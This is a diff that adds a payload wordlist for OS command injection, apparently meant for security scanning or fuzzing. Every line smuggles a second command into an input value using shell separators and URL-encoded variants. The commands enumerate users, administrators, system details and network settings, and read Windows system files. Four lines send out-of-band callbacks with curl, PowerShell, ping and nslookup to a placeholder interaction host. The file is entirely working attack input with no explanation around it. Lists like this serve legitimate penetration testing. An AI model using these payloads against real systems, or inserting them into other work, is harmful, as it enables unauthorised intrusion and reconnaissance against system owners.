@@ -1,0 +1,35 @@
+test&whoami
+test|whoami
+test&&whoami
+test||whoami
+test&whoami&
+test%26whoami
+test%7cwhoami
+test%26%26whoami
+test%7c%7cwhoami
+test & whoami
+test | whoami
+test && whoami
+test || whoami
+test;whoami
+test\nwhoami
+test%0awhoami
+test%0d%0awhoami
+test`whoami`
+test$(whoami)
+test;dir
+test&dir c:\
+test|type c:\windows\win.ini
+test&type %SystemRoot%\system32\drivers\etc\hosts
+test;ipconfig /all
+test&net user
+test|net localgroup administrators
+test&systeminfo
+test&whoami /all
+test%0a%0dwhoami
+test^whoami
+test^^whoami
+test & curl http://INTERACTSH_URL/
+test & powershell -c "Invoke-WebRequest http://INTERACTSH_URL/"
+test & ping -n 1 INTERACTSH_URL
+test & nslookup INTERACTSH_URL
